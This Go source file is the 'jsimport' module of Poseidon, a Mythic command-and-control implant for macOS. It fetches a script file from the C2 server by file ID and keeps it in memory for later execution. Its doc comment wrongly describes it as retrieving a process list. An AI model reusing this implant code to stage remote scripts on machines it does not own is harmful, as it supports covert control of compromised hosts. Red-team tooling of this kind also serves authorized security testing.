package jsimport

import (
	// Standard
	"encoding/json"
	"fmt"
	"sync"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// initial .m code pulled from https://github.com/its-a-feature/macos_execute_from_memory
// and https://github.com/opensource-apple/dyld/tree/master/unit-tests/test-cases/bundle-memory-load
var mu sync.Mutex

type jsimportArgs struct {
	FileID       string `json:"file_id"`
}

type getFile func(r structs.FileRequest, ch chan []byte) ([]byte, error)

//Run - interface method that retrieves a process list
func Run(task structs.Task, ch chan []byte, f getFile, imported_script *string) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	args := jsimportArgs{}

	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		encErrResp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
		mu.Unlock()
		return
	}
	r := structs.FileRequest{}
	r.TaskID = task.TaskID
	r.FileID = args.FileID
	r.ChunkNumber = 0
	r.TotalChunks = 0

	fBytes, err := f(r, ch)

	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to get file. Reason: %s", err.Error()))
		encErrResp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
		mu.Unlock()
		return
	}
	*imported_script = string(fBytes)
	msg.Completed = true
	msg.UserOutput = "Imported script"
	respMarshal, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, respMarshal)
	mu.Unlock()
	return
}
